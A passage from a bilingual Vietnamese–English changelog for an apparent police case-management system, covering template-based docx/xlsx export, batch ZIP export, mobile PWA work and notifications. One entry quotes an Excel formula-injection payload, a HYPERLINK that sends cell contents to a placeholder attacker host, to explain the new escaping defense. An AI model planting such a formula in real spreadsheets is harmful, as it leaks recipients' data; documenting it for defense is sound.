- Dry-run preview endpoint reading staging rows
- Conflict detection (duplicate IDs across units)
- Dual-confirm commit (2 different admins, 24h window)
- Per-row `importLogId` provenance on Case/Incident
- Rollback endpoint (revert + cascade delete via existing schema cascade)
- Unit scope enforcement at commit time (user in DOI4 cannot commit DOI6 data)
- Frontend upload + preview + commit UI

## [0.47.0.5] - 2026-05-29

**v0.47 Document + Report Template Engine — PR4 Track B Generate (xlsx hardening + infra)**

PR4 builds the v0.47 hardening layer on top of the existing `PhuLuc16ExportService` rather than duplicating the export pipeline. Track B *Generate* surface is now safe against CSV/Excel formula injection, and the asset-bundling story for xlsx templates is wired into CI so we can't ship a release missing the binaries (mirror of the PR2 hotfix pattern).

### Added
- **`escapeXlsxCell` formula-injection defense** (`backend/src/common/utils/xlsx-formula-escape.util.ts`): prefixes any user-supplied string starting with `=`, `+`, `-`, `@`, `\t`, or `\r` with `'`. Excel renders the literal instead of evaluating the formula. Applied to both `_writeIncidents` (PL01-03) and `_writeCases` (PL04-06) data row writers — covers the classic `=HYPERLINK("https://attacker.example/?leak="&A1,"Click")` exfil payload that triggers when a recipient opens the report.
- **`XlsxTemplateLoaderService`** (`backend/src/document-templates/xlsx-loader.service.ts`): module-init fail-fast loader for `PHU_LUC_0{1..6}.xlsx`. Mirror of `DocxTemplateLoader` from PR2. SHA256 cache per template for audit. `XLSX_TEMPLATE_DIR_OVERRIDE` env hook for the missing-file boot test. Not wired into the export path yet — PR4.1 will switch `PhuLuc16ExportService` from build-from-scratch (`BcaExcelHelper`) to template-clone + `PhuLucReportLog` audit row.
- **6 xlsx template skeletons** (`backend/templates/xlsx/PHU_LUC_0{1..6}.xlsx`): header rows + column widths matching the BCA print layout. Generated by `backend/scripts/generate-xlsx-templates.ts` (one-off).
- **CI verify step extended** (`.github/workflows/deploy.yml`): now checks EXACT 6 docx + 6 xlsx names in `dist/templates/` post-build (was: 6 docx only). Catches future asset-bundling regressions before prod boot — the PR2 v0.47.0.2 incident pattern.
- **9 unit tests** in `xlsx-formula-escape.util.spec.ts` covering null/undefined, numbers/dates pass-through, every formula trigger, the HYPERLINK payload, and the no-double-prefix invariant.

### Changed
- **`nest-cli.json` assets**: second `include` block for `../templates/xlsx/*.xlsx` so `nest build` copies xlsx templates into `dist/templates/xlsx/`. Existing docx entry unchanged.

### Test counts
- Backend: 1893/1893 pass (+9 from formula-escape spec, baseline was 1884)
- Frontend: 787/787 (unchanged)
- `npx tsc --noEmit` clean

### Deferred to PR4.1
- `PhuLucReportLog` audit row insert (needs `unitCode` + `period` plumbed from `PhuLuc16Controller` → `PhuLuc16ExportService.export()`).
- Replace `BcaExcelHelper` build-from-scratch with `XlsxTemplateLoader`-cloned workbooks so officers can edit the visual template in Excel and `templateSha` audit catches drift.
- Worker thread offload for multi-unit aggregation > 5 đơn vị (Piscina pool per plan decision #P1).
- Reports page UI tweaks (download UX polish, period picker refinements).

## [0.47.0.4] - 2026-05-29

**v0.47 Document + Report Template Engine — PR3.1 Track A frontend**

Frontend wiring cho 6 docx export pipeline đã ship trong PR2/PR3 backend. End-to-end render path giờ usable từ UI lần đầu tiên.

### Added
- **Section 6 "Nội dung phiếu đề xuất"** trên PetitionFormPage (chỉ hiện ở edit mode): 4 inputs nghiệp vụ (Nhận thấy, Đề xuất xử lý, Kết quả rà soát đơn/vụ trùng, Báo cáo Ban Giám đốc). Bắt buộc khi xuất Phiếu đề xuất.
- **Nút "Xuất tài liệu" dropdown** ở footer của PetitionFormPage (edit mode) với 6 doc types — Phiếu đề xuất, Phiếu chuyển nguồn tin (Mẫu 03 TT 128/2025/TT-BCA), Phiếu chuyển đơn, Thông báo chuyển đơn, Thông báo hướng dẫn khởi kiện, Thông báo trả lại đơn. Tải docx về máy.
- **Multi-select checkbox column** trên PetitionListPage cho batch ZIP export. Header checkbox chọn tất cả trên trang hiện tại. Sticky batch toolbar khi đã chọn ít nhất 1 đơn ("Đã chọn N đơn — Xuất tài liệu hàng loạt").
- **BatchExportModal**: chọn loại tài liệu + cảnh báo khi vượt 100 đơn + download ZIP từ backend. Mỗi đơn render trong transaction riêng — đơn nào lỗi ghi vào manifest.json trong ZIP, không huỷ cả batch.
- **Backend DTO mở rộng** (`CreatePetitionDto` + `UpdatePetitionDto`): whitelist 11 v0.47 fields (nhanThay, deXuat, raSoatTrung, baoCaoBanGiamDoc, petitionDate, nguonDon, subTeamAssigned, lyDoChuyen, canCuPhapLy, huongDanKhoiKien, lyDoTraDon) với @MaxLength + stripHtmlTags anti-XSS. Service spread thêm conditional save logic.

### Fixed (review pass)
- **P1 Export-while-dirty**: dropdown disabled khi formData khác snapshot saved (tránh render docx với data cũ trong DB).
- **P1 Select-all wrong scope**: dùng `displayedPetitions` (trang hiện tại sau filter), không `petitions` (tất cả 100 fetched). Tránh cross-page selection silent.
- **P1 Clear field**: submit gửi empty string thay vì `|| undefined` để backend conditional spread có thể clear nội dung đã lưu.
- **P1 Blob URL leak**: `revokeObjectURL` chuyển vào `finally` block.
- **P2 Blob error response**: parse blob JSON error trước khi gọi `extractApiError` (officer thấy lỗi cụ thể "Thiếu trường nhanThay" thay vì generic "Không xuất được").

### Mobile UX
- Touch targets min-h-[44px] trên dropdown + button.
- text-base sm:text-sm trên textarea (no iOS zoom on focus).
- max-w-[calc(100vw-2rem)] trên dropdown menu + modal.
- Hidden label trên small viewport, icon-only fallback.

### Test counts
- Backend: 1884/1884 (unchanged — không có spec backend mới)
- Frontend: 787/787 (unchanged)
- tsc clean

### Deferred to PR3.2
- Source-resolver `lookup:teams.code` extension (gỡ Đ1 hardcode cho multi-team)
- Touch-target enlarge BatchExportModal close button
- pointerdown click-outside (mousedown reliability iOS Safari)
- RFC 5987 `filename*=` parser cho Vietnamese non-ASCII filenames
- `subTeamAssigned` → Team FK validation (currently 255-char free text)
- Inline toast + scroll-to-field thay vì window.alert
- BatchExportModal preview list (hiển thị tên N đơn được chọn trước khi xuất)
- pagination/filter useEffect clears selectedIds (tránh stale cross-page selection sau filter)
- Edit history audit trên nhanThay/deXuat (design review M2)

## [0.47.0.3] - 2026-05-29

**v0.47 Document + Report Template Engine — PR3/6 Batch ZIP backend**

Batch export endpoint trên backend. Frontend wiring (form + dropdown + list checkboxes + mobile responsive) tách sang follow-up PR để review quality cao hơn (separate concern). Endpoint mới chưa có UI gọi.

### Added
- **`POST /api/v1/petitions/export-document-batch`** — body `{ docType, petitionIds: string[] }` (1..100). Streams ZIP của N rendered docx + `manifest.json` với per-petition success/failure breakdown. Mỗi petition render trong tx riêng — 1 fail không abort batch.
- **`BatchExportService`** (Injectable):
  - `validateBatchRequest`: 400 nếu empty / >100 / unknown docType / duplicate ids (defense vs DocumentRenderLog race)
  - `sanitizeBatchFilename`: produces `batch-PHIEU_DE_XUAT-20260529-103000.zip` qua filename.util
  - `exportBatchToZip`: archiver streams chunks trực tiếp đến `res.write` — không bao giờ accumulate full ZIP trong memory
- **`PetitionsService.exportDocumentToBuffer`** — extracted từ `exportDocument` để batch flow gọi N lần mà không cần N Response objects. `exportDocument` giờ là thin facade stream buffer.

### Changed
- **`archiver`** downgraded 8.x → 7.x. archiver 8.x là ESM-only, breaks ts-jest transformer. 7.x là CommonJS, behaves identically cho ZIP streaming use case.

### Deferred to follow-up PR3.1
- Frontend pieces (T11-T13, T15): PetitionFormPage section "Nội dung phiếu đề xuất", PetitionDetailPage dropdown "Xuất tài liệu" 6 options, PetitionListPage multi-select + batch toolbar, mobile responsive. Tách riêng để keep backend PR focused + review quality cao.
- `lookup:teams.code` source-resolver extension (gỡ Đ1 hardcode trong PR1 seed).

### Test counts
- Backend: 1876 → 1884 (+8 net-new batch-export spec)
- Frontend: 787 unchanged
- tsc --noEmit clean

## [0.47.0.2] - 2026-05-29

**v0.47 Document + Report Template Engine — PR2/6 Track A backend**

Backend wiring cho 6 templates docx + atomic transaction render path. Vẫn không có user-facing change tới end user — endpoint mới chưa có UI gọi (PR3). Feature flag chưa bật, legacy `/export-word` endpoint vẫn hoạt động.

### Added
- **6 templates docx** trong `backend/templates/docx/` cho 6 loại văn bản (PHIEU_DE_XUAT, PHIEU_CHUYEN_NGUON_TIN, PHIEU_CHUYEN_DON, THONG_BAO_CHUYEN, THONG_BAO_HUONG_DAN, THONG_BAO_TRA_LAI). Generated programmatically via `backend/scripts/generate-docx-templates.ts` để bảo đảm mọi placeholder là single-run (Word autocorrect có thể split `{placeholder}` thành nhiều `<w:r>` khi edit thủ công). Records officer có thể chỉnh wording legal trong Word post-deploy — `DocumentRenderLog.templateSha` (PR1 schema) khóa audit trail vào đúng binary version đã render.
- **`nest-cli.json` assets config** copy templates sang `dist/templates/docx/` khi build. Trước đó deploy sẽ 500 lần render đầu tiên.
- **`DocxTemplateLoaderService`** (`backend/src/document-templates/docx-loader.service.ts`) — singleton @Injectable. Load 6 binaries vào `Map<DocumentType, Buffer>` lúc module init, refuse boot nếu thiếu file. SHA256 cache cho audit log. `DOCX_TEMPLATE_DIR_OVERRIDE` env override để test missing-file path.
- **`DocumentExportService`** (`backend/src/petitions/document-export.service.ts`):
  - `DOC_TYPE_TO_SERIES` mapping 6 docTypes → 4 numbering series. PHIEU_CHUYEN_NGUON_TIN + PHIEU_CHUYEN_DON dùng chung counter PC. THONG_BAO_CHUYEN + THONG_BAO_TRA_LAI dùng chung TB.
  - `validateFieldsForDocType` — fail-closed per docType (Phiếu đề xuất cần nhanThay + deXuat, Phiếu chuyển cần lyDoChuyen, Thông báo hướng dẫn cần huongDanKhoiKien, Thông báo trả lại cần lyDoTraDon — tất cả 6 cần senderName + detailContent/summary). Throws BadRequestException với tên field cụ thể để PR3 frontend scroll tới.
  - `renderDocxTemplate` — pure render via docxtemplater. `paragraphLoop`, `linebreaks`, `nullGetter='' ` để missing placeholders không tạo `[undefined]` artifacts.
- **`PetitionsService.exportDocument(id, docType, actorId, dataScope, res)`** — orchestration:
  - RBAC scope check via existing `getById`
  - Atomic `prisma.$transaction`:
    - `SELECT ... FOR UPDATE` row lock trên petition (race condition C2 từ fresh eng review — 2 exports đồng thời cùng petition không thể allocate 2 số khác nhau)
    - `DocumentNumbersService.commitWithTx(series, ctx, tx, opts)` — reuse v0.42 engine với 4 series từ PR1 T4
    - render docx
    - insert `DocumentRenderLog` (PR1 schema)
  - Render throw → tx rollback → no orphan counter increment + no log rows
  - templateSha stamped post-tx (cheap field-only update outside lock window)
  - Filename sanitized via PR2 T9 utility
- **Endpoint `GET /api/v1/petitions/:id/export-document?docType=...`** — `@RequirePermissions read:Petition`, `@Throttle 5/min/user`, 400 nếu docType ngoài 6-value allowlist. Legacy `/export-word` giữ nguyên cho backward compat.
- **Filename sanitizer** `backend/src/common/utils/filename.util.ts` (PR2 T9):
  - Strips path separators (`/`, `\\`), control chars (`\\x00..\\x1f`), Windows-reserved chars (`?`, `%`, `*`, `:`, `|`, `"`, `<`, `>`), traversal `..`
  - Prefixes `'` nếu filename bắt đầu bằng `=`, `+`, `-`, `@`, `\\t`, `\\r` (Excel/CSV injection guard trong zip listings — PR3 batch export)
  - Caps 200 chars
  - Preserves Vietnamese diacritics qua NFC normalization
- **User-input docxtemplater injection defense** (`escapeUserSuppliedTokens`): replace `{`/`}` trong mọi user-supplied placeholder value bằng Unicode look-alike `❴`/`❵`. Malicious `senderName: "{deXuat}"` sẽ render literal, không trigger interpolation. Spec verified — secret xuất hiện đúng 1 lần.

### Changed
- **`PetitionsModule`** import `DocumentTemplatesModule` + register `DocumentExportService` provider.
- **PetitionsService constructor** thêm `DocumentExportService` dependency (test mocks updated).

### Test counts
- Backend: 1848 → 1876 (+28 net-new: 6 loader + 8 sanitizer + 14 export)
- Frontend: 787 unchanged
- tsc --noEmit clean

### Deferred to follow-up
- T-RACE concurrent-export integration test (needs real Postgres tx — better as e2e in PR3)
- T-RENDER-FAIL integration test (covered by tx wrapper structure + manual review)
- Source-resolver `lookup:teams.code` extension (Đ1 hardcode trong PR1 seed vẫn còn — PR3 sẽ revisit khi wire team scope properly)

## [0.47.0.1] - 2026-05-29

**v0.47 Document + Report Template Engine — PR1/6 Foundation**

PR đầu trong loạt 6 PR của v0.47 (Document + Report Template Engine v1.0). Foundation only — không có thay đổi user-facing nào tới end user trong PR này. Toàn bộ code paths của foundation đều behind feature flag hoặc inert (chưa được wire vào endpoint nào). PR2-PR6 sẽ kích hoạt từng phần.

### Fixed
- **P0 timezone bug trên Document Number Engine v0.42** (`backend/src/document-numbers/period-key.util.ts`): `computePeriodKey` dùng `getUTCFullYear()` thay vì giờ Việt Nam, gây cửa sổ 7 giờ mỗi ngày 1/1 (00:00–06:59 ICT) mà số văn bản bị đóng dấu năm trước theo Nghị định 30/2020. Sửa bằng tham số `tz` mặc định `'Asia/Ho_Chi_Minh'` sử dụng `Intl.DateTimeFormat`. Module-load ICU probe từ chối boot nếu Node binary thiếu full-icu (small-icu Node sẽ âm thầm fallback về UTC, regress lại bug). Refactor `isoWeekParts` helper để loại bỏ trùng lặp giữa YEARLY/WEEKLY paths.

### Added
- **Petition schema** (`prisma/schema.prisma`): 11 cột nghiệp vụ mới (`nhanThay`, `deXuat`, `raSoatTrung`, `baoCaoBanGiamDoc`, `petitionDate`, `nguonDon`, `subTeamAssigned`, `lyDoChuyen`, `canCuPhapLy`, `huongDanKhoiKien`, `lyDoTraDon`) phục vụ render 6 loại văn bản trong PR2 (Phiếu đề xuất, Phiếu chuyển nguồn tin, Phiếu chuyển đơn, Thông báo chuyển, Thông báo hướng dẫn, Thông báo trả lại).
- **Case + Incident schema**: 2 cột TĐC khắc phục (`tdcKhacPhucLyDoBienPhap`, `tdcKhacPhucBienBan`) cho Phụ lục 02/03/05/06 + 5 cột import audit (`importedFrom`, `importedAt`, `importedById`, `sourceFile`, `importLogId`) cho per-row provenance khi PR5/PR6 import từ xlsx của các đơn vị trực thuộc.
- **User.rank**: cột text cho quân hàm cán bộ (Trung tá / Thượng tá / Đại úy ...) — single source of truth cho signatory block trên 6 loại văn bản, thay thế cách denormalize trên Team.
- **4 bảng audit mới**: `DocumentRenderLog` (1 dòng/render, lưu templateSha + generatedNumber + fileSha cho pháp lý), `PhuLucReportLog` (1 dòng/báo cáo xlsx generate), `XlsxImportLog` (lifecycle SHA dedupe + dual-confirm + rollback), `XlsxImportStaging` (parser chỉ ghi vào đây, không bao giờ trực tiếp upsert vào Case/Incident — defense-in-depth theo khuyến nghị Codex SPLIT review).
- **4 series số văn bản mới** (`backend/prisma/seed-document-numbers.ts`): PHIEU_DE_XUAT (ĐX), PHIEU_CHUYEN (PC dùng chung cho chuyển nguồn tin + chuyển đơn), THONG_BAO (TB dùng chung cho thông báo chuyển + trả lại), HUONG_DAN (HD). Tất cả `resetPeriod: 'YEARLY'`, format `5931/ĐX-PC02-Đ1`. Counter reset hằng năm đúng giờ Việt Nam nhờ fix P0 phía trên. Tạm hardcode `Đ1` ở phía suffix — PR2 sẽ thay bằng FORMULA segment dùng `lookup:teams.code` cho đa đội. Seed force-refresh segments + counterConfig khi gặp template v0.47 đã tồn tại, đảm bảo edit của PR2 tự động propagate.
- **Audit script** `backend/scripts/audit-petition-fields.ts`: đo tỷ lệ Petition.detailContent + summary cùng NULL, đếm Case/Incident TAM_DINH_CHI — chạy trên prod để quyết định bật fail-closed validation trong PR2 và scope backfill cho TĐC fields. Trả về verdict `INSUFFICIENT_DATA` khi DB rỗng (tránh false positive `0/1 < 0.05` = SAFE).

### Changed
- **Migration** `prisma/migrations/20260529000001_v047_pr1_foundation/migration.sql`: prepend `SET lock_timeout = '5s'; SET statement_timeout = '60s';` để fail fast trên lock contention thay vì queue sau long-running transaction và stall API. Migration thuần additive — rollback strategy forward-only (git revert code, để schema đó).
- **Test counts**: backend 1819 → 1848 (+29 net-new: 4 timezone fix tests + 6 timezone boundary tests + 19 seed regression tests), frontend 787 (unchanged), tsc clean.

### Engineering notes
- Eng review (`/plan-eng-review` fresh pass) phát hiện 4 quyết định trong plan ban đầu là parallel infrastructure đã có sẵn trong v0.42 Document Number Engine — đã drop (`DocumentTemplateRegistry` JSON file, `TemplateCacheService`, 4 cột cache docNumber per docType trên Petition, 8 cột audit per docType trên Petition) để reuse `DocumentNumberTemplate` table + `commitWithTx` trong PR2.
- `/review` chạy 3 specialist subagent song song (testing + data-migration + adversarial), phát hiện 7 critical findings được auto-fix trong commit `af954ce` trước khi mở PR cho anh duyệt.

## [0.46.0.1] - 2026-05-29

**Hotfix Mobile Drawer — Bulletproof rendering trên iOS Safari**

Sau khi anh báo cáo trên iPhone 15 Pro Max: hamburger button không hiển thị + sidebar 64px cứng hiển thị trên header. /investigate phát hiện vấn đề ở CSS cascade Tailwind `lg:translate-x-0` không tin cậy trên iOS Safari 17+ trong một số config zoom/PWA.

### Fixed
- **Mobile drawer state-driven render**: thay vì phụ thuộc CSS `lg:` cascade, MainLayout render 2 DOM branch riêng theo `isDesktopWidth` state. Mobile branch dùng inline `style.transform: translateX(...)`. Loại bỏ hoàn toàn race condition CSS cascade.
- **Hamburger button**: render dựa trên `!isDesktopWidth` state (bỏ `lg:hidden`). Trên iPhone, hamburger giờ luôn hiển thị đúng.
- **Backdrop**: state-driven `!isDesktopWidth && sidebarOpen` (bỏ `lg:hidden`).
- **Initial state safer**: `isDesktopWidth` mặc định `false` (mobile-first) khi SSR/hydration, sau đó update qua matchMedia. Tránh "desktop flash".
- **visualViewport API**: dùng `window.visualViewport.width` khi available (chính xác hơn `innerWidth` trên iOS Safari zoom/PWA mode).

### Technical Notes
- Test counts unchanged: 787/787 frontend PASS, 1819 backend PASS.
- Tests updated mock `window.matchMedia` và `window.innerWidth=430` qua `Object.defineProperty` (jsdom mặc định 1024).
- React 19 native `inert` boolean prop vẫn dùng cho mobile drawer khi closed.

## [0.46.0.0] - 2026-05-29

**Mobile Responsive + PWA — Cán bộ điều tra dùng được hệ thống trên điện thoại, cài đặt như native app**

Hệ thống PC02 giờ đây hoạt động đầy đủ trên mobile (390×844px iPhone 12 trở lên) và có thể cài đặt như native app trên màn hình chính (Android Chrome + iOS Safari 16.4+). ĐTV thực địa có thể tra cứu vụ án, lãnh đạo duyệt/phân công khi đi ra ngoài, click FCM notification mở thẳng vào trang đúng layout — hoàn thiện vòng lặp giá trị từ v0.45 Notification Center.

### Added
- **AppSidebar mobile drawer** — Sidebar 260px ẩn mặc định trên mobile <1024px, hiện qua hamburger button (top-left, 44×44 touch target). Slide-in overlay 250ms với backdrop click-to-close + Escape key support. Auto-đóng khi navigate (watch React Router v7 `location` object để bắt cả query-param change).
- **PWA installable** — Manifest, service worker, icons (192/512/180-apple-touch). Cài đặt qua "Add to Home Screen" → launch standalone, theme color Xanh Công An (#003973). Tên app: "PC02 Quản lý Án".
- **Update prompt** — Banner cập nhật ở bottom (z-30, không block modal) khi service worker phát hiện version mới. registerType='prompt' (không autoUpdate) để bảo vệ form data đang nhập dở.
- **EmptyMobileState component** — Component dùng chung cho empty/error state mobile (icon + Vietnamese message + retry CTA 44×44).

### Changed
- **MODAL_CONTAINER** — Full-screen trên mobile (<640px), centered card trên desktop. Dùng `dvh` với `@supports` fallback cho older Android browsers (Samsung Internet, UC Browser). z-40 < sidebar drawer z-50 (tránh conflict khi drawer mở).
- **MODAL_HEADER/FOOTER** — Sticky top/bottom giúp X close và nút Save luôn visible khi scroll modal nội dung dài.
- **MainLayout header** — Padding mobile thu gọn (`px-4 lg:px-6`), hamburger button thay logo+title trên màn hình hẹp.
- **TABLE_WRAPPER constant** — Thêm negative margin `-mx-4 px-4 sm:mx-0` cho horizontal scroll extend tới viewport edge trên xs.

### Security
- **Workbox API allowlist** — Service worker chỉ cache `/api/v1/health`, `/api/v1/notifications`, `/api/v1/feature-flags` (non-PII). Dữ liệu vụ án/vụ việc/đơn thư KHÔNG cache trong CacheStorage để tránh exfiltration risk nếu xảy ra XSS.

### Technical Notes
- Test coverage: 23 test mới (MainLayout.mobile +7, AppSidebar.mobile +5, Modal.mobile +7, EmptyMobileState +9, PwaUpdatePrompt +7 — trừ overlap). Tổng frontend 778/778 PASS, backend 1760/1760 PASS.
- vite-plugin-pwa@1.3.0 + workbox-window@7.4.1 (verified Vite 7 peer dep compatibility per auto-decision #19).
- iOS PWA limitation: FCM push không nhận được trên installed iOS PWA (Safari restriction). User vẫn nhận in-app notification badge qua SSE.
- isCompact 64px sidebar mode được force `false` khi drawer mở trên mobile (auto-decision #13 — tránh state collision).
- TDD: 28 Red-Green-Refactor cycles theo plan v0.46 — mọi production code có failing test trước.

## [0.45.0.0] - 2026-05-27

**Notification Center v2 — EventEmitter + SSE real-time + FCM push với work-hours queue**

Cán bộ điều tra không còn bỏ lỡ phân công vụ án: badge thông báo cập nhật tức thì qua SSE, FCM push gửi trong giờ làm việc (7:00–18:00 T2–T7) với retry exponential backoff.

### Added

#### Backend
- **EventEmitter2 decoupled events**: `EventEmitterModule.forRoot({ global: true })` trong AppModule; 8 typed event classes (`CaseAssigned`, `IncidentAssigned`, `PetitionAssigned`, `UydtAssigned`, `CaseCreated`, `CaseStatusChanged`, `PetitionReceived`, `IncidentCreated`)
- **NotificationEventService**: 4 active `@OnEvent` handlers + 3 stubs; `sendInApp()` helper kiểm tra `NotificationPreference` trước khi tạo record; D5 try/catch + logger.error mỗi handler; D7 DRY single helper
- **NotificationSseService + SseController**: D13 tách state/logic; multi-tab support (Map<userId, Set<Subject>>); D4 heartbeat 30s; `SseJwtGuard` RS256 JWT từ `?token=` query param + tokenVersion/isActive validation
- **Work-hours utility**: D8 getUTCHours()+7 (không dùng OS timezone); D11a check same-day 07:00 trước khi advance; D11b nextRetryTime() wrap qua nextWorkHoursTime(); exponential backoff 1h→2h→4h
- **NotificationPushScheduler**: D2 không dùng Prisma field-to-field comparison; `take: 100` per cron tick; mutex flag chống cron overlap
- **NotificationCleanupScheduler**: xóa notifications > 90 ngày đã đọc và acknowledged (Chủ nhật 10:00 VN)
- **RecipientResolverService**: extract `getTeamRecipients()` từ DeadlineScheduler (D6); fallback `getAllHeadUnits()` cho CASE_CREATED
- **NotificationPreferences API**: `GET /notification-preferences`, `PUT /notification-preferences/:type`, `POST /notification-preferences/reset` — upsert per-channel (inApp/push); default `inApp=true, push=true`
- **Domain service wiring**: Cases/Incidents/Petitions/Delegations emit typed events trên assign + create
- **D10 fix**: `markAsRead()` luôn set `acknowledgedAt` + `pushNextRetryAt=null` bất kể `isRead` state — ngăn push retry vô hạn khi đọc qua dropdown mà chưa click link
- **B1 fix**: `markAllAsRead()` cũng set `acknowledgedAt` + `pushNextRetryAt=null` — cùng ngữ nghĩa với markAsRead
- **W3 fix**: `DelegationsService.create()` emit `utdt.assigned` khi `assignedToId` được set (trước đây chỉ `update()` emit)
- **C3 fix**: `assignedToId` lưu vào cả 2 nhánh create (auto-number + manual-number); thêm vào `CreateDelegationDto`
- **Prisma schema**: `Notification` thêm 5 fields (`acknowledgedAt`, `pushSentAt`, `pushRetryCount`, `pushNextRetryAt`, `pushMaxRetries`); `NotificationPreference` model mới; `Delegation.assignedToId` → `User?`; 6 enum values mới (`INCIDENT_ASSIGNED`, `PETITION_ASSIGNED`, `UTDT_ASSIGNED`, `INCIDENT_CREATED`, `CASE_STATUS_CHANGED`, `PETITION_RECEIVED`)

#### Frontend
- **SSE thay polling**: `NotificationDropdown.tsx` dùng `EventSource` với fallback polling 60s khi SSE fail
- **4 TypeConfig entries mới**: `INCIDENT_ASSIGNED` (orange), `INCIDENT_CREATED` (orange), `PETITION_ASSIGNED` (violet), `UTDT_ASSIGNED` (indigo + ExternalLink icon)
- **NotificationsModule.tsx**: bảng cài đặt thông báo trong Settings — 4 nhóm (Vụ án / Tố giác / Vụ việc / UTDT), 2 kênh (Trong app / Push FCM), auto-save optimistic, reset với confirm dialog

### Fixed
- D2: Scheduler WHERE loại bỏ `pushRetryCount < pushMaxRetries` (Prisma không hỗ trợ field-to-field comparison)
- D3: `onCaseCreated` dùng `RecipientResolverService` thay vì query role string trực tiếp
- D4: SSE heartbeat 30s giữ connection qua NAT/firewall
- D5: try/catch mọi `@OnEvent` handler — không còn silent failure
- D6: `getTeamRecipients()` extract thành `RecipientResolverService` — không duplicate vs DeadlineScheduler
- D8: `nextWorkHoursTime()` dùng UTC+7 cố định — server UTC không ảnh hưởng
- D10/B1: markAsRead + markAllAsRead luôn clear push retry (xem Added)
- D11a/D11b: work-hours utility fix cả 2 edge case (same-day 07:00, nextRetryTime wrap)
- D13: SseController inject SseService không inject vào Provider — chuẩn NestJS DI

## [0.44.3.0] - 2026-05-26

**UTDT — đồng bộ bộ lọc màn hình Ủy Thác Điều Tra**

### Added
- **Bộ lọc ngày tiếp nhận**: 2 ô date range ("Ngày tiếp nhận từ" / "Ngày tiếp nhận đến") trong filter panel — gửi `ngayTiepNhanFrom`/`ngayTiepNhanTo` lên API, backend filter theo `ngayTiepNhan` range.
- **Bộ lọc điều tra viên**: ô text input tìm theo tên điều tra viên (partial, case-insensitive match trên `firstName` hoặc `lastName`) — gửi `investigatorName` lên API.
- **CaseStatus badge** trong cột Trạng thái: hiển thị badge trạng thái vụ án nhỏ bên dưới badge trangThaiPhanHoi — đồng bộ thông tin với các màn hình Cases/Incidents.
- **Debounce 300ms** cho search và investigatorName — giảm số lần gọi API khi người dùng đang gõ (chuẩn IncidentListPage).
- **`CASE_STATUS_OPTIONS`** export dùng chung từ `status-labels.ts` — xóa khai báo inline trùng lặp trong UyThacDieuTraListPage.

### Changed
- Filter panel mở rộng từ 4 → 7 controls (4-col grid, 2 rows tự nhiên).
- Backend `QueryCasesDto` thêm 3 fields mới: `ngayTiepNhanFrom`, `ngayTiepNhanTo`, `investigatorName`.

## [0.44.2.2] - 2026-05-26

### Fixed
- **UTDT delete: thiếu reason body** (P1-A): `DELETE /cases/:id` trong UyThacDieuTraListPage không gửi body `{ reason }` — backend `DeleteCaseDto` yêu cầu `@MinLength(10)` → trả về 400 cho mọi lần xóa. Fix: truyền `{ data: { reason: 'Xóa ủy thác điều tra theo yêu cầu' } }` vào `api.delete`.
- **UTDT update: các trường UTDT không được lưu** (P1-B): `cases.service.ts update()` không đưa các field UTDT top-level (`donViGiao`, `ngayTiepNhan`, `thoiHanUyThac`, `loaiUyThac`, `ketQuaUyThac`, `ngayTraKetQua`, `soQuyetDinhUyThac`, `loaiThongTin`, `caseType`) vào `updateData` — chỉnh sửa hồ sơ UTDT bị mất dữ liệu thầm lặng. Fix: thêm 9 spread conditional fields vào update handler.

## [0.44.2.1] - 2026-05-26

### Fixed
- **Logo trong suốt**: bỏ nền trắng logo PC02 TpHCM — favicon và login page hiển thị đúng trên mọi nền màu.

## [0.44.2.0] - 2026-05-26

**UTDT — tích hợp tab "Thông tin Ủy thác" vào CaseFormPage (v0.44.2.0)**

### Added
- **Tab "Thông tin Ủy thác"** trong CaseFormPage: tab xuất hiện ở vị trí thứ 2 (ngay sau "Thông tin") khi `caseProvenance === 'UY_THAC_DIEU_TRA'`. Hiển thị đầy đủ 3 section UTDT (thông tin ủy thác, nguồn đơn, kết quả) — dùng lại `CaseFormTab1UyThac`.
- **Tiêu đề/breadcrumb theo ngữ cảnh**: CaseFormPage tự điều chỉnh title ("Ủy thác điều tra — Tạo mới" / "Chỉnh sửa ủy thác điều tra") khi mở từ flow UTDT.
- **Bộ lọc "Trạng thái Vụ án"** trong danh sách UTDT: filter theo `status` (TIEP_NHAN, DANG_XAC_MINH, DANG_DIEU_TRA, ...) gửi lên API `?status=X`.
- **Cột "Mã hồ sơ" (`caseCode`)** trong bảng danh sách UTDT: hiển thị ở đầu bảng với font mono màu xanh.
- **Nút Xóa UTDT**: soft-delete `DELETE /cases/:id` với confirm dialog "Xóa ủy thác điều tra này? Hồ sơ vụ án gốc vẫn được giữ nguyên."
- **`PageHeader`** cho màn hình danh sách UTDT — đồng bộ UX với CaseListPage / IncidentsListPage.

### Changed
- **Routes UTDT**: `/uy-thac-dieu-tra/new` → redirect về `/cases/new?caseProvenance=UY_THAC_DIEU_TRA&returnPath=/uy-thac-dieu-tra`; `/:id/edit` → redirect về `/cases/:id/edit?returnPath=/uy-thac-dieu-tra`. Form riêng `UyThacDieuTraFormPage` đã bị xóa — CaseFormPage đảm nhiệm toàn bộ.
- **`returnPath` + `safeReturn`**: CaseFormPage đọc `?returnPath` từ URL, về đúng danh sách UTDT sau khi lưu/hủy (whitelist `/uy-thac-dieu-tra`, `/cases`).
- **Thứ tự menu**: "Đối tượng liên quan" (`order: 101`) xuất hiện sau "Ủy Thác Điều Tra" (default 100) trong sidebar.
- **Edit mode hydration**: `mergeCaseApiToFormData` nay hydrate đầy đủ 11 fields UTDT (top-level + metadata) — tab "Thông tin Ủy thác" không còn hiện trống khi chỉnh sửa.
- **Validation**: `buildCreateCasePayload` báo lỗi "Đơn vị giao ủy thác là bắt buộc" khi `utdt_donViGiao` rỗng trong flow UTDT.

### Removed
- **`UyThacDieuTraFormPage.tsx`**: form standalone không còn cần thiết. Tab trong CaseFormPage thay thế hoàn toàn.

## [0.44.1.1] - 2026-05-26

### Changed
- **Logo hệ thống**: cập nhật logo Công An Nhân Dân Việt Nam (PC02 TpHCM) trên toàn hệ thống (login page, sidebar, favicon, mobile app).

## [0.44.1.0] - 2026-05-26

**UTDT — form tạo/sửa ủy thác + menu "Nhập ủy thác mới"**

### Added
- **Form tạo/sửa UTDT** (`UyThacDieuTraFormPage`): form riêng cho Ủy Thác Điều Tra với 4 section (Thông tin chung / Thông tin Ủy Thác / Nguồn Đơn / Kết quả). Hỗ trợ cả create (`/uy-thac-dieu-tra/new`) và edit (`/uy-thac-dieu-tra/:id/edit`). Badge `trangThaiPhanHoi` tính live từ form state.
